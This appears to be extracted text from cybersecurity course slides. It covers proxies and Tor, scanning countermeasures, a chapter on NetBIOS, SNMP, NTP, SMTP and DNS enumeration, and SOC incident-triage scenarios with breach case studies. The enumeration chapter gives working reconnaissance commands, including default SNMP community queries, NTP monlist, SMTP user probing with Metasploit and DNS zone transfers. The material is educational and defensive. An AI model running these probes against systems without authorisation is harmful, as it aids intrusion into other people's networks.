between:\n§ Internal user and Internet resource\n§ Internet user and internal resource\n§ Use an online proxy to:\n§ Hide source IP address to avoid discovery\n§ Increase privacy\n§ Conduct anonymous hacking attacks\n§ Mask the source of an attack by impersonating a false source\n§ Remotely access intranets and website resources that are normally protected\n§ Interrupt all requests sent by a user and re-route them to a different\ndestination, making it see only the proxy server address\n§ Chain multiple proxy servers to avoid detection\n§ AKA The Onion Router\n§ A free and open-source software for enabling\nanonymous communication\n§ Directs Internet traffic through a worldwide overlay\nnetwork\n§ Over 6000 relays\n§ Conceals a user’s location and usage from network\nsurveillance and traffic analysis\n§ Your route changes every 10 minutes\n§ Makes it more difficult to trace Internet activity to the\nuser\n§ Intended use is to protect personal privacy\n§ Unfortunately has also become home to“dark web” criminal\nactivity\n§ A TOR browser aims to make all users look the same\n§ Making it difficult to fingerprint you based on your browser\nor device\n§ Easy to set up and use\n§ Download a TOR browser from\nhttps://www.torproject.org/download/\n§ Implement a software firewall on all devices\n§ Limit the number of open ports\n§ Block ICMP\n§ Configure routers to disallow vulnerable features such as source routing and \nIP fragments\n§ Use an IDS/IPS to monitor network traffic\n§ Patch hosts\n§ Conduct your own scans pre-emptively\n§ Ensure that the IDS, routers, and firewall firmware are updated to their latest \nreleases\n§ Consider using a cloud-based SIEM to leverage more sophisticated/longer \nterm traffic analysis\n§ In a high-security environment, consider hard-coding MAC-to-IP \naddress mappings for each host\n§Do not rely on IP-based authentication\n§Digitally sign all transmissions\n§Use stateful firewalls with deep packet inspection\n§Disallow source routing\n§Disallow incoming packets that appear to come from your own network\n§ Spoofed source IP\n§ Be cautious when allowing traffic based on source port\n§ Hard-code ARP entries where practical\n§ Hard-code IP addresses where practical\n§ Use switchport security\n§ Secure DNS server cache against pollution\n§Disable or change the banner\n§ Display false/misleading banners\n§ Make sure banner does not advertise the service version\n§ Add an “authorized users only” warning to a banner to protect yourself\nlegally\n§ Especially for services that require a user to log on\n§Turn off unnecessary services\n§Hide file extensions from web pages such as .asp or .htm\n§ IIS can use tools like PageXchanger to manage file extensions\n§ Apache can edit httpd.conf with mod_negotiation directives\n§ Use a multilayer defense strategy\n§ Implement multiple firewall solutions at different levels\n§ Implement strong change management\n§ Stay on top of security patches/updates\n§ Set strong password policies and multifactor authentication\n§ Look for“side doors” and “back doors” that can bypass the firewall\n§ Wi-Fi access points\n§ VPN / Remote Access servers\n§ Private WAN links / VPNs to other company sites\n§ “Sneakernet” (physically moving data in and out of the network on removeable media)\n§ Perform your own firewall tests to ensure rules behave as desired\n§ Regularly perform penetration tests\n45\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\PDF Presentation\\Chapter-5Enumeration.pdf": "Chapter-5\nEnumeration\nTopics Covered.\n• \nEnumeration Concepts\n• \nNetBIOS Enumeration\n• \nSNMP Enumeration\n• \nNTP and NFS Enumeration\n• \nSMTP and DNS Enumeration\n• \nOther Enumeration Techniques\n• \nEnumeration Countermeasures\n§ The systematic process of querying a target’s servers and services for\ninformation\n§ The attacker utilizes information gathered during footprinting /\nreconnaissance to know which devices and services to query\n§ We exploit normal server functionality and protocols to gain more information\nabout our target\n§ Enumeration should appear to the server as a normal client making legitimate information \nrequests\n§ Your enumeration test should focus on the information you need\n§ You want to avoid returning too much information that will clutter your results\n§ A combination of manual and automated testing will give the best results\nWe enumerate to find possible entry points into the target system!\n§ OS and service details\n§ Users and groups\n§ Email addresses and contact information\n§ Network resources\n§ Network shares\n§ Routing tables\n§ Audit and service settings\n§ SNMP and DNS information\n§ Machine names\n§ Applications and banners\n§ Network Basic Input/Output System\n§ An API and Layer 5 protocol\n§ Allows applications to communicate over a local area network (LAN) with\ndevice specific NetBIOS names\n§ 1 - 15 alphanumeric characters (a hidden 16th character describes the name type)\n§ Special characters can only include: - . _ $ (dash, period, underscore, dollar sign)\n§ $ has special meaning (name or share exists but is hidden on the network)\n§ Only the dash is compatible with DNS naming conventions\n§ Used by Microsoft for simple LAN communications, name resolution and\nfile sharing\n§ Originally used by broadcast-based NetBEUI networking protocol\n§ Microsoft later made it a payload of TCP/IP (NetBIOS over TCP)\n§ TCP 137,139;UDP 137,138\nName\nNetBIOS\nCode\nType\nInformation Obtained\n<host name>\n<00>\nUnique\nHostname\n<domain>\n<00>\nGroup\nDomain name\n<host name>\n<03>\nUnique\nMessenger service running for that computer\n<username>\n<03>\nUnique\nMessenger service running for that individual \nlogged-in user\n<host name>\n<20>\nUnique\nServer service running\n<domain>\n<1D>\nGroup\nMaster browser name for that subnet\n<domain>\n<1B>\nUnique\nDomain master browser name, identifies PDC for \ndomain\nAttackers use the NetBIOS enumeration to obtain\n• The list of computers that belong to a domain \n• The list of shares on the individual hosts in the network\n• Policies and passwords\n§ Windows utility\n§ Displays NetBIOS over TCP/IP protocol statistics, NetBIOS name tables for local\nand remote computers, and the NetBIOS name cache\nnbtstat [-a RemoteName] [-A IPAddress] [-c] [-n] [-r] [-R] [-RR] [-\ns] [-S] [Interval]\nTool-1 NBTSTAT\nTool-2 NET Commands\n§ Has 19 sub commands for enumerating information via NetBIOS\n§ Runs on Linux\n§ Enumerates NetBIOS information fromWindows and Linux SAMBA\n§ -A\nall\n§ -U get userlist\n§ -M get machine list\n§ -N get namelist dump (different from -U and-M)\n§ -S\nget sharelist\n§ -P\nget password policy information\n§ -G get group and member list\nTool-3 \nENUM4LINUX\n§ Used to centrally monitor devices on a network\n§ An SNMP manager polls agents for information\n§ Polling is done round-robin style, on a regular interval (every few minutes)\n§ Manager is software on a server or workstation\n§ Agent is small software installed or built into a device OS\n§ The manager uses a Management Information Base (MIB) to know what types of information\nan agent can provide\n§ A MIB is a set of counters (Object IDs) relevant to the device\n§ SNMP has several versions that are still in use\n§ v1, v2, v2c all communicate in clear text\n§ v3 is encrypted\n§ Not all devices support v3\n§ Both the manager and agent are configured with a simple authentication mechanism called \nthe “community string”\n§ Simple text string\n§ An agent will only respond to a manager that has the same community string\n§ There are two default community strings:\n§ “Public” – for read-only queries\n§ “Private” – for read/write communications\n§ Many administrators do not change the default community strings\n§ Managed Device\n§ Router, switch, hub, firewall, computer, server service (DHCP, DNS, etc.) printer, IoT device\n§ Agent\n§ Software installed on managed device\n§ Responds to the NMS\n§ Network Management System (NMS)\n§ Typically software installed on a dedicated computer\n§ Management Information Base(MIB):- A collection of OIDs stored in a\ntext file\n§ Most SNMP managers have 2 MIBs already installed\n§ Vendor-neutral MIBs\n§ Vendor-specific MIBs for popular products\n§ Object Identifier(OID):- Represents a single “question” an SMNP manager \ncan ask an agent \nSNMP MIBS and AGENTS\nSNMP Example\n§ SNMP Ports:\n§ UDP 161 - Manager queries and agent replies\n§ UDP 162 – Agents “raise traps” (send pre-configured alerts) to the manager\n§ SNMP is a good target for enumeration\n§ Often the defaults are not changed:\n§ Community strings\n§ Encryption levels\n§ Most versions use clear-text communications\n§ Microsoft devices don’t even support the encrypted version\n§ You might be able to sniff community strings and manager-agent\ncommunications\n§ Many SNMP management tools include a feature to discover all the\nMIBs installed on the agents\n§ You can also “walk” the MIB\n§ Start at a single common OID\n§ Repeatedly ask the device to“get-next” until it runs out of OIDs to report on\n§ Network devices\n§ Hosts\n§ Users and groups\n§ Services\n§ Installed software\n§ Network shares\n§ Device configurations\n§ IP and MAC addresses\n§ ARP tables\n§ Routing tables\n§ VLANs\n§ Port and interface status\n§ Network traffic\n§ and much, much more\n§snmpget\n§ Query a single OID\n§snmpwalk\n§ Query an entire MIB starting from a particular OID\nsnmpget [options] [community string] [host name/address] [OID]\nSnmpget and snmpwalk \nhave the same syntax.\nBoth Windows and Linux\nuse these commands.\n$ snmpget -v 2c 127.0.0.1 -c public .1.3.6.1.2.1.1.5.0 SNMPv2-\nMIB::sysName.0 = STRING:centos7\n$ snmpget -v 2c 127.0.0.1 -c public sysName.0 SNMPv2-\nMIB::sysName.0 = STRING:centos7\n§ Network Time Protocol (NTP) is used to synchronize clocks of network\ndevices\n§ UDP 123\n§ Can maintain time to within 10 milliseconds over the public Internet\n§ Attackers query NTP for\n§ List of hosts connected to NTP server\n§ Clients IP addresses, system names, and operating systems\n§ Internal IP addresses can be acquired if the NTP server is on the DMZ\nActive Directory clients use Windows Time (not NTP) to synchronize their clocks to the domain \nThe Active Directory PDC Emulator domain controller is the time source for the domain.\nIt can synchronize to other sources via NTP.\n§Ntpdate\n§ Query a time server\nntpdate -q pool.ntp.org\n§Ntptrace\n§ Traces a chain of NTP servers back to the primary source\nntptrace\n§Ntpdc\n§ Monitors operation of the NTP server\n§ This example requests the last 600 clients that connected to the NTP\ntime server:\nntpdc -n –c monlist <IP or hostname of time server>\n§ NTP Time Server Monitor\n§ NTP Server Scanner\n§ Nmap \n§ ACME client uses SMTP to send email \nmessage to email server for acme.com\n§ Local email server performs DNS lookup to find\nMX record and IP address (A/AAAA record) of\nemail server for example.com\n§ Acme.com email server uses SMTP to \ndeliver message to example.com email \nserver\n§ Example.com email server puts message into\nexample.com client mailbox\n§ Example.com client later retrieves message \nusing POP3, IMAP4, HTTP,or even RPC\nPOP\nIMAP\nHTTP\nSMTP\nSMTP\nSMTP\nInternet\nDNS\nClient\nClient\nMail Server\nExample.com\nMailbox\nDatabase\nMail Server\nAcme.com\n§ Simple Mail Transfer Protocol (SMTP) has three built-\nin commands\n§ VRFY – validates that an email address actually exists\nfor a user\n§ EXPN – request or expand a mailing list into individual\nrecipients\n§ RCPT TO – Specifies the actual recipient(s)\n§ As an attacker, you can use the SMTP commands\nmanually to enumerate valid email addresses\n§Tools\n§ telnet\n§ netcat\n§ NetScanTool Pro\n§ smtp-user-enum\n§ smtp_user_enum.py\n§ Kali iSMTP\n§ Metasploit auxiliary module\nsmtp_enum\n§ nmap NSE script smtp-enum-users\ntelnet <email server> 25 vrfy\ntest@example.com\nIf you receive a message code 250,251,252:\nThe server has accepted the request and the user account is valid\nIf you receive a message code 550:\nThe user account is invalid\nTELNET SMTP\nEnumeration Example\n1. In Kali Linux,create a list of possible email addresses and save to\nyour Desktop as user.txt\n2. Open Metasploit Framework\n3. In the Metasploit console enter these commands:\nuse auxiliary/scanner/smtp/smtp_enum set\nrhosts <email server IP>\nset rport 25\nset USER_FILE /root/Desktop/user.txt exploit\nMetasploit SMTP Enumeration Example\nNmap\nEnumeration \nExample\n§Query a DNS server for its records:\n§ A, AAAA                 NS                       MX\n§ CNAME                 PTR                        SOA\n§Obtain individual records or“zone transfer” the entire database\nfile\n§ Exploit DNS AXFR (all transfer) vulnerability\n§ Some DNS servers will transfer their entire zone to any requestor\nwithout requiring authentication\n§ This saves the attacker time\n§ You can also just manually request all the various record types and end up\nwith the same content\n§Microsoft tool for querying DNS\n§ nslookup [-option] [name | -] [server]\n§You can also install on Linux\n§ sudo apt install dns-utils\n§ sudo dnf install bind-utils\n§Depends on the existence of a\nreverse lookup zone to work\nproperly\nEXAMPLE:- \n• nslookup example.com\n• nslookup -type=ns example.com\n• nslookup -type=soa example.com \n• nslookup -query=mx example.com \n• nslookup -type=any example.com \n• nslookup examp.com ns1.nsexamp.com \n• nslookup 10.20.30.40\n• nslookup -type=ptr 96.96.136.185.in-\naddr.arpa\nTool- nslookup\nDNS \nEnumeration \nusing Zone \nTransfer -\nNSlookup\n§ *Nix tool for querying DNS\n§ You can also install (slightly older version) on Windows\n§ Syntax:\ndig Hostname\ndig\ndig\nDomaiNameHere\n@DNS-server-name Hostname\ndig @DNS-server-name IPAddress\ndig @DNS-server-name Hostname|IPAdd\nress type\ndig\nwww.example.com A\ndig\n74.125.236.167\ndig\n+short example.com\nMX\ndig\n+short example.com\nTXT\ndig\n+short example.com\nNS\ndig\nexample.com ANY\n§ The hacker used DIG to successfully\ntransfer the zone and enumerate the hosts\n§ AXFR domain.com\n§ What do you see in this exhibit?\n§ When possible, use protocols that are encrypted, rather than clear text\n§ Disable NetBIOS and SMBv1\n§ Change the SNMP community string\n§ Disallow DNS zone transfers to unknown servers\n§ Maintain separate DNS servers for internal and public records (split DNS)\n§ Consider disabling VRFY and EXPN commands on your email server\n§ Use file system and share permissions to restrict access to sensitive\ncontent\n30\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Chapter 10 Simulate Incident Triage Scenarios Using Predefined Incident Reports.pptx": "Simulate Incident Triage Scenarios Using Predefined Incident Reports.\nCSSY4103 - Security Operations Centre (SOC)\nScenario 1: \u000bNetwork Outage\nPotential Actions:\nConfirm the Outage: Contact finance department representatives to gather more details.\nCheck Network Status: Review network monitoring tools to pinpoint where the failure occurred.\nIdentify Recent Changes: Look for any recent updates or maintenance work done on network equipment.\nNotify IT Management: Escalate the issue to IT management and provide regular updates.\nDeploy Workaround: Set up a VPN for finance users to access critical systems temporarily.\nTriage Outcome:\nAction Taken: Verified the outage with affected users and confirmed issues with the core router.\nNext Steps:\nAssign a network engineer to diagnose and fix the router issue.\nProvide updates to affected departments every 30 minutes until resolution.\nDocument the incident for future reference and post-incident analysis.\nIncident Report:\nTitle: Major Network Outage\nDescription: At 10:00 AM, users in the finance department reported they couldn't access the internal financial systems, which are critical for month-end closing. IT received multiple complaints from approximately 50 users. The network monitoring tool indicates a significant increase in packet loss and latency.\nSeverity: High\nTime Reported: 10:15 AM\nImpact: Major disruption to financial operations, potential delays in payroll processing.\n\nScenario 2: \u000bSecurity Breach\nPotential Actions:\nInvestigate Email Origin: Check email headers to trace the source of the phishing emails.\nAlert Security Team: Inform the cybersecurity team immediately to initiate a broader investigation.\nEmployee Warning: Draft a company-wide alert advising employees to be cautious of similar emails.\nAnalyze Email Logs: Review logs to identify any other unusual activity related to employee accounts.\nEnhance Email Filters: Implement stricter email filtering rules to catch future phishing attempts.\nTriage Outcome:\nAction Taken: Security team confirmed that the emails originated from an external IP address.\nNext Steps:\nSend a company-wide alert detailing the phishing attempt and guidelines for reporting suspicious emails.\nMonitor for further unauthorized access attempts and enhance training on email security for all employees.\nConduct a security audit to identify any potential vulnerabilities in the email system.\n\nTitle: Possible Security Breach\nDescription: An employee in HR reported receiving several phishing emails appearing to come from the company’s internal HR email account. The emails request sensitive employee information under the guise of a \"mandatory compliance update.\" This incident raised concerns about the security of internal email accounts.\nSeverity: Critical\nTime Reported: 11:00 AM\nImpact: Potential exposure of sensitive employee data.\nScenario 3: \u000bSoftware Bug\nPotential Actions:\nGather Error Logs: Collect and analyze detailed logs from the payroll application and database to identify the root cause.\nNotify Payroll Team: Inform the payroll team about the issue and its potential impact on payroll timelines.\nRevert to Stable Version: If necessary, roll back to a previous stable version of the software while investigating.\nCommunication: Update all employees regarding potential delays and reassure them that the issue is being addressed.\nVendor Support: If the issue persists, escalate to the software vendor for technical support.\nTriage Outcome:\nAction Taken: Error logs indicated a database timeout, and a rollback was initiated to the last stable version.\nNext Steps:\nMonitor the payroll system for stability after the rollback.\nPrepare a communication to employees regarding the timeline for payroll processing.\nSchedule a meeting with the software vendor to discuss the bug and preventive measures for the future.\nIncident Report:\nTitle: Critical Bug in Payroll System\nDescription: The payroll system crashed while processing monthly payroll on the scheduled run at 2:30 PM, causing a halt in payroll processing for all employees. Initial error logs indicate a database timeout issue, which has never occurred before during payroll runs.\nSeverity: High\nTime Reported: 2:45 PM\nImpact: Significant delays in payroll disbursement, affecting employee satisfaction and potentially leading to compliance issues.\n\nScenario 4: \u000bHardware Failure\nPotential Actions:\nVerify Server Status: Attempt to access the server remotely and check the status via the management interface.\nCheck Monitoring Alerts: Review alerts from the server monitoring system for any anomalies or errors leading up to the failure.\nRestart the Server: If possible, attempt a remote restart of the server.\nInform the Application Team: Notify the application team about the outage and its potential impact.\nSchedule Hardware Technician: If the restart fails, schedule a technician to inspect the hardware.\nTriage Outcome:\nAction Taken: Server status checks indicated a hardware failure; a remote restart was unsuccessful.\nNext Steps:\nSchedule an on-site technician to assess the hardware issue.\nCommunicate with the sales team about the outage and provide an estimated time for resolution.\nPrepare a contingency plan for order processing through an alternative system if the outage extends beyond a few hours.\nTitle: Server Failure\nDescription: One of the application servers went down unexpectedly at 9:00 AM, affecting access to a critical internal application used by the sales team. The server is responsible for processing customer orders and is integral to daily operations. A preliminary check shows it is unresponsive.\nSeverity: Medium\nTime Reported: 9:30 AM\nImpact: Disruption in order processing, potentially affecting revenue.\nScenario 5: \u000bData Leak Incident\nPotential Actions:\nImmediate Investigation: Review logs to determine the exact data accessed and the employee's activities.\nSuspend Account: Temporarily disable the employee's account pending investigation.\nNotify Security Team: Alert the cybersecurity team to start a formal investigation.\nInform Legal/Compliance: Notify the legal and compliance teams regarding potential regulatory implications.\nPrepare Communication: Draft a communication for affected customers if a breach is confirmed.\nTriage Outcome:\nAction Taken: Logs confirmed unauthorized access to sensitive data; the employee's account was suspended.\nNext Steps:\nConduct a full forensic investigation to understand the extent of the data accessed.\nReview and update DLP policies based on findings.\nPlan for communication to customers if necessary.\nIncident Report:\nTitle: Possible Data Leak Detected\nDescription: An alert from the data loss prevention (DLP) system indicates that a large volume of sensitive customer data was accessed and downloaded by an employee in the sales department. This incident was flagged at 3:15 PM.\nSeverity: Critical\nImpact: Potential data breach, regulatory implications, and customer trust concerns.\nScenario 5: \u000bData Leak Incident\nPotential Actions:\nImmediate Investigation: Review logs to determine the exact data accessed and the employee's activities.\nSuspend Account: Temporarily disable the employee's account pending investigation.\nNotify Security Team: Alert the cybersecurity team to start a formal investigation.\nInform Legal/Compliance: Notify the legal and compliance teams regarding potential regulatory implications.\nPrepare Communication: Draft a communication for affected customers if a breach is confirmed.\nTriage Outcome:\nAction Taken: Logs confirmed unauthorized access to sensitive data; the employee's account was suspended.\nNext Steps:\nConduct a full forensic investigation to understand the extent of the data accessed.\nReview and update DLP policies based on findings.\nPlan for communication to customers if necessary.\nIncident Report:\nTitle: Possible Data Leak Detected\nDescription: An alert from the data loss prevention (DLP) system indicates that a large volume of sensitive customer data was accessed and downloaded by an employee in the sales department. This incident was flagged at 3:15 PM.\nSeverity: Critical\nImpact: Potential data breach, regulatory implications, and customer trust concerns.\nScenario 6: \u000bApplication Downtime\nPotential Actions:\nVerify the Issue: Check with multiple users to confirm the application is down.\nCheck Server Status: Review application server logs and monitoring dashboards for any errors or downtime reports.\nRestart Application Services: Attempt to restart the application services on the server.\nNotify IT Management: Inform management of the downtime and expected resolution time.\nUpdate Users: Communicate with all users about the downtime and provide status updates.\nTriage Outcome:\nAction Taken: The application services were successfully restarted after identifying a resource exhaustion issue.\nNext Steps:\nMonitor application performance for any further issues.\nConduct a post-mortem analysis to prevent future occurrences.\nUpdate documentation on application resource management.\nIncident Report:\nTitle: Internal Application Down\nDescription: The internal project management application is inaccessible for all users. The issue was first reported at 9:45 AM, with users receiving a \"503 Service Unavailable\" error.\nSeverity: High\nImpact: Disruption to project tracking and team collaboration.\nScenario 7: \u000bPhishing Attack\nPotential Actions:\nInvestigate Email Source: Check the headers of the reported emails to trace the sender's IP and email domain.\nNotify Security Team: Alert the security team to start monitoring for further phishing attempts.\nAlert Employees: Send an immediate communication to all employees about the phishing attempt and instruct them not to click on links or provide credentials.\nBlock Malicious Domains: Work with IT to block the domains identified in the phishing emails.\nReview Security Policies: Consider a review of current security training and awareness programs for employees.\nTriage Outcome:\nAction Taken: The source of the phishing emails was identified and blocked; an alert was sent to all employees.\nNext Steps:\nPlan a training session to reinforce email security best practices.\nMonitor for additional phishing attempts.\nReview existing security measures to improve defenses.\nIncident Report:\nTitle: Phishing Emails Reported\nDescription: Several employees reported receiving suspicious emails that appear to come from the IT department, asking them to verify their credentials. The emails were reported around 11:00 AM.\nSeverity: Medium\nImpact: Potential risk of credential theft and compromise of internal systems.\nDifferent SOC Team Roles\nTier 1 — Triage Specialist\nTier 1 analysts retrieve raw data and assess alarms and alerts. \nThey verify, alter, and enrich alert criticalities using relevant data. \nGiven alert fatigue, the triage specialist must determine if each alarm is legitimate or a false positive. \nAt this level, you must also detect high-risk events and possible incidents and prioritize them by importance. \nIf difficulties cannot be resolved, layer 2 analysts are contacted. \nTriage professionals oversee and configure monitoring tools.\nTier 2 — Incident Responder\nTriage specialists escalate higher-priority security incidents to analysts, who use threat intelligence (indicators of compromise, updated rules, etc.) to assess them. \nThey must know the attack's breadth and affected systems. \nTier 2 turns raw attack telemetry data into actionable threat intelligence. \nIncident responders create and implement containment and recovery plans. \nIf a tier 2 analyst has trouble recognizing or neutralizing an attack, other analysts are contacted or the problem is escalated to tier 3.\nTier 3 — Threat Hunter\nTier-3 analysts are the most experienced SOC staff. \nIncident responders escalate major incidents to them. \nThey also conduct or supervise vulnerability and penetration testing to discover attack routes. \nTheir main task is to proactively detect unknown threats, security holes, and vulnerabilities. \nThey should also suggest ways to optimize security monitoring tools as they learn about a system danger. \nThis layer must also evaluate significant security warnings, threat intelligence, and other security data from tier 1 and 2 analysts.\n\nSOC Manager\nSOC managers manage security operations. \nTheir main responsibility is team management, although they also offer technical advice. \nHire, train, and evaluate team members; create processes; assess incident reports; and create and implement crisis communication plans. \nIn addition to managing SOC finances, they support security audits and report to the CISO-  chief information security officer, or other top manager.\n\nIn Addition Multiple Technical Roles \nMalware Analysts or Reverse Engineers\nThreat Hunters\nForensics Specialists or Analysts\nVulnerability Managers\nConsulting roles\n\n\n Ethical Considerations In SOC Operations\nEthical Considerations In SOC\nSecurity operations center (SOC) teams are vital in the fight against cyber threats to enterprises. But there's a heavy need to act ethically when you have this kind of authority. \nTo make sure their efforts are successful and responsible, SOC professionals should keep the following in mind.\nData Privacy and Minimization\nUser Notification:\nVulnerability Disclosure\nLegal Compliance\nTransparency and Trust\nEthical Hacking\nAdditional Considerations IF ANY\n\n\n\n\n\n\n\nData Privacy and Minimization\nCollect and retain only essential data: \nFocus on information directly relevant to security investigations and analysis. \nAvoid storing excessive personal data or data unrelated to security incidents.\nAnonymize or pseudonymize data when possible: \nMinimize the risk of identifying individuals by obscuring names while still allowing for effective analysis.\nDevelop clear data retention policies: \nDefine timeframes for storing data and procedures for secure disposal after it's no longer required.\nUser Notification\nInform users of security incidents promptly and transparently: \nUsers have the right to know if their data might have been compromised.\nStrike a balance between transparency and avoiding panic: \nProvide clear explanations and mitigation steps without causing undue alarm.\nVulnerability Disclosure\nFollow responsible disclosure practices: \nWhen encountering security vulnerabilities, notify the software vendor or system owner before publicly disclosing them. \nThis allows them time to address the vulnerability and minimize potential harm.\nProvide reasonable time for a fix: \nAllow the vendor or owner time to patch the vulnerability before making it public knowledge to avoid exploitation.\n\nLegal Compliance\nAdhere to data privacy regulations: \nEnsure compliance with regulations like GDPR (General Data Protection Regulation) and national cybersecurity laws. \nThese regulations outline specific requirements for data collection, storage, and user notification in case of security incidents.\n\nTransparency and Trust\nMaintain transparency in security practices: \nBuild trust with users and stakeholders by being clear about what data is collected, how it's used, and the safeguards in place to protect it.\nAvoid intrusive monitoring techniques: \nRespect user privacy and legitimate activities by only employing monitoring methods necessary for security purposes.\nEthical Hacking\nOnly conduct penetration testing or vulnerability assessments with proper authorization: \nEnsure you have legal permission to test a system's security before proceeding.\nClearly define the scope and boundaries of authorized testing activities: \nAvoid exceeding established limitations or accidentally causing damage during testing.\nAdditional Considerations\nNational Security and Law Enforcement Cooperation: \nWhile SOCs strive to uphold ethical principles, situations may arise where they are legally obligated to cooperate with national security or law enforcement requests.\n In these cases, following established legal procedures and seeking guidance from management is crucial.\nCultural Sensitivity: \nBe mindful of cultural sensitivities when handling data from diverse users. \nFor instance, what constitutes acceptable data collection practices might vary across regions.\nExamples of prominent Data Privacy Laws\nGlobal Landscape: Over 137 out of 194 countries have implemented data privacy legislation [UNCTAD, Data Protection and Privacy Legislation Worldwide]. \nGeneral Data Protection Regulation (GDPR): A regulation in EU law on data protection and privacy in the European Union (EU) and the European Economic Area (EEA). \nCalifornia Consumer Privacy Act (CCPA): A law that regulates the collection and use of consumer data by businesses in the State of California.\nChina's Personal Information Protection Law (PIPL): A comprehensive data privacy law that regulates the collection, use, storage, transfer, and processing of personal information within China.\nExamples of prominent Data Privacy Laws\nNCTAD Data Protection and Privacy Legislation Worldwide: https://unctad.org/page/data-protection-and-privacy-legislation-worldwide\nEU General Data Protection Regulation (GDPR): https://gdpr.eu/\nCalifornia Consumer Privacy Act (CCPA): https://oag.ca.gov/privacy/ccpa\nChina's Personal Information Protection Law (PIPL): https://www.justice.gov/\n\n Case Studies and Real-World Examples\u000b(Self-Study)\u000b\u000b\n Equifax: The Breach that Shattered Trust\nThe Breach\nIn 2017, Equifax, one of the largest credit reporting agencies, fell victim to a massive data breach that exposed the personal information of nearly 147 million individuals. The breach included sensitive data such as names, Social Security numbers, birthdates, and addresses, leaving millions vulnerable to identity theft and fraud.\nLessons Learned\n1. Patch Management is Crucial:\nThe breach exploited a known vulnerability in the Apache Struts web application framework. Equifax failed to patch the vulnerability promptly, highlighting the critical importance of timely patch management. Organizations must prioritize staying current with security patches to prevent known vulnerabilities from being exploited.\n2. Transparency Builds Trust:\nEquifax faced severe backlash not only for the breach itself but also for its delayed and unclear communication with affected individuals. Transparency in communication is paramount during a cybersecurity incident. Organizations should proactively communicate the extent of the breach, steps taken to address it, and measures for affected individuals to protect themselves.\n\n\n\nTarget: A Cybersecurity Bullseye\nThe Breach\nIn 2013, retail giant Target suffered a significant breach during the holiday shopping season. Hackers gained access to Target’s network through a third-party HVAC contractor, eventually compromising the credit card information of over 40 million customers and the personal information of 70 million individuals.\nLessons Learned\n1. Third-Party Risks Require Vigilance:\nTarget’s breach underscored the risks associated with third-party vendors. Organizations must thoroughly vet and monitor the cybersecurity practices of vendors with access to their networks. Note that a chain is only as strong as its weakest link.\n2. Advanced Threat Detection is Vital:\nTarget failed to detect the initial stages of the breach, allowing hackers to remain undetected for an extended period. Implementing robust advanced threat detection systems is crucial for identifying and mitigating breaches in their early stages.\n\n\nWannaCry: A Global Ransomware Epidemic\nThe Breach\nIn 2017, the WannaCry ransomware swept across the globe, infecting hundreds of thousands of computers in over 150 countries. Exploiting a vulnerability in Microsoft Windows, WannaCry encrypted users’ files and demanded ransom payments in Bitcoin for their release. \nLessons Learned\n1. Regular System Updates are Non-Negotiable:\nWannaCry leveraged a vulnerability that had been addressed by a Microsoft security update months before the outbreak. Organizations fell victim due to delayed or neglected updates. Regularly updating operating systems and software is fundamental to thwarting ransomware attacks.\n2. Backup and Recovery Planning is Essential:\nOrganizations that had robust backup and recovery plans were able to restore their systems without succumbing to ransom demands. Implementing regular backup procedures and testing the restoration process can mitigate the impact of ransomware attacks.\n\n\nSony Pictures Hack: A Cyber Espionage Saga\nThe Breach\nIn 2014, Sony Pictures Entertainment became the target of a devastating cyberattack that exposed an array of sensitive information, including unreleased films, executive emails, and employee records. The attackers, linked to North Korea, sought to retaliate against the film “The Interview,” which portrayed the fictional assassination of North Korea’s leader.\nLessons Learned\n1. Diverse Attack Vectors:\nThe Sony hack demonstrated that cyber threats can come from unexpected sources and employ diverse attack vectors. Organizations must not only guard against common threats but also be prepared for unconventional methods employed by cyber adversaries.\n2. Nation-State Threats:\nThe involvement of a nation-state in the attack highlighted the increasing role of geopolitical motivations in cyber incidents. Organizations should be aware of the potential for state-sponsored cyber threats and implement measures to defend against politically motivated attacks.\n\n\n\nMarriott International: Prolonged Exposure and Ongoing Impact\nThe Breach\nIn 2018, Marriott International disclosed a data breach that had persisted undetected for several years. The breach exposed personal information, including passport numbers, of approximately 500 million guests. The prolonged exposure raised concerns about the importance of timely detection and response.\nLessons Learned\n1. Extended Dwell Time Matters:\nMarriott’s breach highlighted the significance of dwell time—the duration a threat actor remains undetected within a network. Organizations should invest in advanced threat detection capabilities to minimize dwell time and swiftly identify and mitigate potential threats.\n2. Post-Breach Communication:\nMarriott faced criticism for the delayed communication of the breach to affected individuals. Prompt and transparent communication is vital in maintaining trust and allowing individuals to take necessary actions to protect themselves.\n\n\nSolarWinds Supply Chain Attack: A Wake-Up Call\nThe Breach\nIn late 2020, the SolarWinds supply chain attack sent shockwaves through the cybersecurity community. Sophisticated threat actors compromised SolarWinds’ software updates, enabling them to infiltrate thousands of organizations, including government agencies and major corporations.\n Lessons Learned\n1. Supply Chain Vulnerabilities:\nThe incident underscored the vulnerability of the software supply chain. Organizations must conduct thorough assessments of their suppliers’ cybersecurity practices and scrutinize the security of third-party software and services.\n2. Continuous Monitoring is Essential:\nThe SolarWinds attack highlighted the importance of continuous monitoring and threat detection. Organizations should implement robust monitoring systems to identify anomalous behavior and potential indicators of compromise.\n\n\n\nCase Study Analysis (Self-Study)\u000b\nCase Study Analysis\nCase Overview \nTo provide a course of study leading to an understanding of the theory and practical issues that are involved with securing computer networks; and an understanding of key security techniques employed within personal and professional computer networks.\nHypothetical Case Study Details \nXYZ Enterprises is one of the leading groups of companies in OMAN. They are running businesses in different areas and fields. XYZ Enterprises has branch offices in different countries. Due to COVID-19 pandemic situation, all the countries in the world have faced many problems in running their business. The management of this group of companies has decided to automate the entire operations provided by all companies in the group. The automation also targets to improve all the internal operations and the public services which provide online access to their customers and their remote employees. The group of companies have World-wide branch network. All the companies and branches are connected to the corporate office which is in Muscat. They are running business such as Finance (private banks, etc.), Manufacturing and selling networking equipment’s, electrical and electronic appliances, Providing Cloud and Data Centre facilities. Most of their companies interact with customers, distributors, dealers, remote employees via internet. Following key functionality and task to be consider in establishing the security infrastructure.\nCase Study Analysis – Cont.….\n1. Customers, distributers, dealers, remote employees should be able to seek following through online (web/mobile) systems.\nCustomers should be able view their products\nCustomers should be place online orders and make online payments\nSubmit all the related documents online and download all relevant documents\nDistributers and dealers should be able check their stock levels and place online orders\nCertificate verification to identify legitimate business entities.\nPeople should be able to perform their financial transactions securely\nCustomers should ably reserve transport facilities and track the goods\nMaintain continues communication with remote employees and their offices\nPeople can purchase Cloud and Data Centre facilities.\nCase 